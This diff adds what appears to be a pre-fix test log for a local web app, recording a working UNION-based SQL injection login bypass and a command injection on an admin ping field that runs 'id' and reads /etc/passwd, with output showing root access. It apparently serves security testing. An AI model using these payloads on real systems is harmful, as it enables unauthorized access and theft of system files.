@@ -1,0 +1,30 @@
+# BEFORE FIX — attacks succeed (local HTTPS stack, https://localhost)
+# Date: Tue Nov 17 09:44:59 CET 2026
+
+== Flaw #8 SQL injection on /login ==
+-- Note: this build checks the password in Python, not in the SQL WHERE,
+-- so the classic "admin' -- " payload does NOT bypass. A UNION injection does:
+-- username = zzz' UNION SELECT 1,'admin','admin','pwn' --     password = pwn
+
+[classic payload admin' -- ]
+  login HTTP 200
+  /admin title: <title>Redirecting...</title>
+
+[UNION payload -> real bypass]
+  login HTTP 302  (302 = success, logged in as admin, no real password)
+  /admin title: <title>NotesApp</title>
+
+== Flaw #9 command injection on /admin/ping (reusing SQLi admin session) ==
+host = 127.0.0.1; id; head -2 /etc/passwd
+
+[command injection output — id + /etc/passwd leaked after ping]
+  PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.093 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.093/0.093/0.093/0.000 ms
+uid=0(root) gid=0(root) groups=0(root)
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+
